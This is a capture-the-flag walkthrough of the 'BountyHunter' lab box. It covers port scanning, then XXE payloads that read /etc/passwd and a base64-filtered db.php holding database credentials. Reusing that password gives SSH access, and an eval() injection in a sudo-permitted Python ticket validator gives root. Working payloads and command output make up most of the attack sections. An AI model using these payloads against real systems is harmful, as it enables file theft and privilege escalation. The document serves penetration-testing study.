# Writeup

## Recon

### rustscan

- A simple rustscan scan found SSH and a webserver.

```
sudo rustscan -a 10.10.11.100 | tee rustscan.txt
```

```
[~] Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-13 14:13 EDT
Initiating Ping Scan at 14:13
Scanning 10.10.11.100 [4 ports]
Completed Ping Scan at 14:13, 0.24s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:13
Completed Parallel DNS resolution of 1 host. at 14:13, 0.05s elapsed
DNS resolution of 1 IPs took 0.06s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 14:13
Scanning 10.10.11.100 [2 ports]
Discovered open port 80/tcp on 10.10.11.100
Discovered open port 22/tcp on 10.10.11.100
Completed SYN Stealth Scan at 14:13, 0.26s elapsed (2 total ports)
Nmap scan report for 10.10.11.100
Host is up, received echo-reply ttl 63 (0.21s latency).
Scanned at 2021-08-13 14:13:10 EDT for 1s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.64 seconds
           Raw packets sent: 6 (240B) | Rcvd: 7 (1.124KB)
```

### nmapAutomator

- nmapAutomator found various interesting files on the webserver, including the `portal.php` and `db.php` files. 

```
sudo nmapAutomator.sh -t Recon -H 10.10.11.100
```

```
Running a Recon scan on 10.10.11.100

Host is likely running Linux


---------------------Starting Port Scan-----------------------



PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http



---------------------Starting Script Scan-----------------------



PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Bounty Hunters
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

...

Starting ffuf scan

.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10]
.php                    [Status: 403, Size: 277, Words: 20, Lines: 10]
                        [Status: 200, Size: 25169, Words: 10028, Lines: 389]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10]
.htaccess.php           [Status: 403, Size: 277, Words: 20, Lines: 10]
.hta.php                [Status: 403, Size: 277, Words: 20, Lines: 10]
.hta                    [Status: 403, Size: 277, Words: 20, Lines: 10]
.htpasswd.php           [Status: 403, Size: 277, Words: 20, Lines: 10]
assets                  [Status: 301, Size: 313, Words: 20, Lines: 10]
css                     [Status: 301, Size: 310, Words: 20, Lines: 10]
db.php                  [Status: 200, Size: 0, Words: 1, Lines: 1]
index.php               [Status: 200, Size: 25169, Words: 10028, Lines: 389]
index.php               [Status: 200, Size: 25169, Words: 10028, Lines: 389]
js                      [Status: 301, Size: 309, Words: 20, Lines: 10]
portal.php              [Status: 200, Size: 125, Words: 11, Lines: 6]
resources               [Status: 301, Size: 316, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
```

### Web enumeration

- Visiting index.php gave a very unassuming site (definitely not giving hints about using Burp later)

![aaa19738a093e3f613350d73367827b4.png](../../_resources/aaa19738a093e3f613350d73367827b4-1.png)

- Visiting portal.php directed to log_submit.php

![ef7283397c1f0354de7ae5e64cbc9883.png](../../_resources/ef7283397c1f0354de7ae5e64cbc9883-1.png)

- ...And log_submit.php had a php form of some sort, so I decided to use Burp Proxy to capture the HTTP data going across. 

## Initial Access

### Submitting data to log_submit.php

- Using Burp Proxy, I was able to capture the base64 encoded data that was passed in the form and determined that it was XML data. 

![36fbb6bd11aaed6be7ee59ea91563aa4.png](../../_resources/36fbb6bd11aaed6be7ee59ea91563aa4-1.png)

![f4ac0e9ce8c9ca5b41b5ecf5c2db686e.png](../../_resources/f4ac0e9ce8c9ca5b41b5ecf5c2db686e-1.png)

![4055bcf00e6ce7f5f1cc4ef048e5f1f0.png](../../_resources/4055bcf00e6ce7f5f1cc4ef048e5f1f0-1.png)

### XXE injection

- I immediately realized that the form could have some XXE injection vulnerabilities. If you don't know about XXE injection, just know that it can lead to SSRF attacks (allowing an attacker to act as the server in some aspect) and possible data exfiltration. 
- To test this, I attempted to exfiltrate the ubiquitous `/etc/passwd` file. 

```
<?xml  version="1.0" encoding="ISO-8859-1"?>
		<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
		<bugreport>
		<title>&xxe;</title>
		<cwe>aaaa</cwe>
		<cvss>aaaa</cvss>
		<reward>aaaa</reward>
		</bugreport>
```

- Before sending the XML data by setting the `data` parameter in Burp Repeater, I had to base64 encode then URL encode it again. 

```
PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8IURPQ1RZUEUgZm9vIFsgPCFFTlRJVFkgeHhlIFNZU1RFTSAiZmlsZTovLy9ldGMvcGFzc3dkIj4gXT4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT4meHhlOzwvdGl0bGU+CgkJPGN3ZT5hYWFhPC9jd2U+CgkJPGN2c3M+YWFhYTwvY3Zzcz4KCQk8cmV3YXJkPmFhYWE8L3Jld2FyZD4KCQk8L2J1Z3JlcG9ydD4K
```

```
%50%44%39%34%62%57%77%67%49%48%5a%6c%63%6e%4e%70%62%32%34%39%49%6a%45%75%4d%43%49%67%5a%57%35%6a%62%32%52%70%62%6d%63%39%49%6b%6c%54%54%79%30%34%4f%44%55%35%4c%54%45%69%50%7a%34%4b%43%51%6b%38%49%55%52%50%51%31%52%5a%55%45%55%67%5a%6d%39%76%49%46%73%67%50%43%46%46%54%6c%52%4a%56%46%6b%67%65%48%68%6c%49%46%4e%5a%55%31%52%46%54%53%41%69%5a%6d%6c%73%5a%54%6f%76%4c%79%39%6c%64%47%4d%76%63%47%46%7a%63%33%64%6b%49%6a%34%67%58%54%34%4b%43%51%6b%38%59%6e%56%6e%63%6d%56%77%62%33%4a%30%50%67%6f%4a%43%54%78%30%61%58%52%73%5a%54%34%6d%65%48%68%6c%4f%7a%77%76%64%47%6c%30%62%47%55%2b%43%67%6b%4a%50%47%4e%33%5a%54%35%68%59%57%46%68%50%43%39%6a%64%32%55%2b%43%67%6b%4a%50%47%4e%32%63%33%4d%2b%59%57%46%68%59%54%77%76%59%33%5a%7a%63%7a%34%4b%43%51%6b%38%63%6d%56%33%59%58%4a%6b%50%6d%46%68%59%57%45%38%4c%33%4a%6c%64%32%46%79%5a%44%34%4b%43%51%6b%38%4c%32%4a%31%5a%33%4a%6c%63%47%39%79%64%44%34%4b
```

- The proof of concept worked! `/etc/passwd` revealed a `development` user that could be useful when using SSH later. Now onto bigger tasks...

![5126660327e29f63b752da4af3c38de6.png](../../_resources/5126660327e29f63b752da4af3c38de6-1.png)

![e0d3d4949a96c41fe7470318490f8284.png](../../_resources/e0d3d4949a96c41fe7470318490f8284-1.png)


### Exfiltrating db.php with encoded XXE injection

- I was still curious as to what content was in that `db.php` file found during recon, but I needed to use some PHP tricks to convert the data to base64 first, as some characters could break the XML when the injection happened. 

```
<?xml  version="1.0" encoding="ISO-8859-1"?>
		<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=./db.php"> ]>
		<bugreport>
		<title>&xxe;</title>
		<cwe>aaaa</cwe>
		<cvss>aaaa</cvss>
		<reward>aaaa</reward>
		</bugreport>
```

- Once again, the payload data had to be base64 encoded and URL encoded before sending in Burp Repeater. 

```
PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8IURPQ1RZUEUgZm9vIFsgPCFFTlRJVFkgeHhlIFNZU1RFTSAicGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT0uL2RiLnBocCI+IF0+CgkJPGJ1Z3JlcG9ydD4KCQk8dGl0bGU+Jnh4ZTs8L3RpdGxlPgoJCTxjd2U+YWFhYTwvY3dlPgoJCTxjdnNzPmFhYWE8L2N2c3M+CgkJPHJld2FyZD5hYWFhPC9yZXdhcmQ+CgkJPC9idWdyZXBvcnQ+Cg==
```

```
%50%44%39%34%62%57%77%67%49%48%5a%6c%63%6e%4e%70%62%32%34%39%49%6a%45%75%4d%43%49%67%5a%57%35%6a%62%32%52%70%62%6d%63%39%49%6b%6c%54%54%79%30%34%4f%44%55%35%4c%54%45%69%50%7a%34%4b%43%51%6b%38%49%55%52%50%51%31%52%5a%55%45%55%67%5a%6d%39%76%49%46%73%67%50%43%46%46%54%6c%52%4a%56%46%6b%67%65%48%68%6c%49%46%4e%5a%55%31%52%46%54%53%41%69%63%47%68%77%4f%69%38%76%5a%6d%6c%73%64%47%56%79%4c%32%4e%76%62%6e%5a%6c%63%6e%51%75%59%6d%46%7a%5a%54%59%30%4c%57%56%75%59%32%39%6b%5a%53%39%79%5a%58%4e%76%64%58%4a%6a%5a%54%30%75%4c%32%52%69%4c%6e%42%6f%63%43%49%2b%49%46%30%2b%43%67%6b%4a%50%47%4a%31%5a%33%4a%6c%63%47%39%79%64%44%34%4b%43%51%6b%38%64%47%6c%30%62%47%55%2b%4a%6e%68%34%5a%54%73%38%4c%33%52%70%64%47%78%6c%50%67%6f%4a%43%54%78%6a%64%32%55%2b%59%57%46%68%59%54%77%76%59%33%64%6c%50%67%6f%4a%43%54%78%6a%64%6e%4e%7a%50%6d%46%68%59%57%45%38%4c%32%4e%32%63%33%4d%2b%43%67%6b%4a%50%48%4a%6c%64%32%46%79%5a%44%35%68%59%57%46%68%50%43%39%79%5a%58%64%68%63%6d%51%2b%43%67%6b%4a%50%43%39%69%64%57%64%79%5a%58%42%76%63%6e%51%2b%43%67%3d%3d
```

- As a result of the PHP encoding trick, the data from the response was base64 encoded, so I had to decode it. 

```
PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=
```

- The decoded `db.php` revealed some juicy credentials!

```
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
```

### Credential reuse for SSH access

- Fortunately, the exfiltrated password worked with the user `development` for an SSH shell.

```
ssh development@10.10.11.100 
```

- User flag done!

```
development@bountyhunter:~$ uname -a
Linux bountyhunter 5.4.0-80-generic #90-Ubuntu SMP Fri Jul 9 22:49:44 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
development@bountyhunter:~$ whoami
development
development@bountyhunter:~$ cat user.txt
43409dc79b623f4d002c5a567313d216
development@bountyhunter:~$ 
```


## Privesc

### Exploiting the eval() statement for privilege escalation

- But what's this? Looks like this user could have some interesting permissions...

```
development@bountyhunter:~$ ls
contract.txt  user.txt
development@bountyhunter:~$ cat contract.txt 
Hey team,

I'll be out of the office this week but please make sure that our contract with Skytrain Inc gets completed.

This has been our first job since the "rm -rf" incident and we can't mess this up. Whenever one of you gets on please have a look at the internal tool they sent over. There have been a handful of tickets submitted that have been failing validation and I need you to figure out why.

I set up the permissions for you to test this. Good luck.

-- John
```

- Sure enough, checking sudo permissions led to an interesting Python script that `development` can run as root. To privilege escalation!

```
development@bountyhunter:/$ sudo -l
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

- Looking at the Python script, it was obvious that there were some obstacles before getting root. I immediately noticed the `eval()` statement as very suspicious, as this is a common way to elevate privileges if the developer is not careful. But first, I had to craft a `.md` file that could break through the many if-statements and correctly take advantage of the unsafe `eval()`. 

```
development@bountyhunter:/$ cat /opt/skytrain_inc/ticketValidator.py
#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.
                                                           
def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:                   
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()
```

- This was the result of the code analysis. Let me try to explain.
	- The program first checks for the first 3 lines to start with specific strings. 
	- Watch out for that pesky space at the end of the second line! (took me a while to realize)
	- Finally, when the program parses the "code line", it must start with **
	- The ** is effectively removed from parsing the ticketCode and validationNumber (using replace())
	- The ticketCode is essentially the first integer that occurs before the +
	- ... And it must be congruent mod 7 to 4 (11 is an easy example)
	- Finally, it evaluates the statement `11+__import__('os').system('su root')`, switching users to root! This happens because, before attempting to "add" Python executes the right operand to see what it returns. By then we are enjoying life as root. (This is my interpretation, I might be misguided but I still like to think of it like this)

```
# Skytrain Inc
## Ticket to 
__Ticket Code:__
**11+__import__('os').system('su root')
```

- Root flag done!

```
development@bountyhunter:~$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
/home/development/exploit.md
Destination: 
root@bountyhunter:/home/development# whoami
root
root@bountyhunter:/home/development# cd /root
root@bountyhunter:~# ls
root.txt  snap
root@bountyhunter:~# cat root.txt
db673a70afb60ee583e06b4564ecd451
root@bountyhunter:~# 

```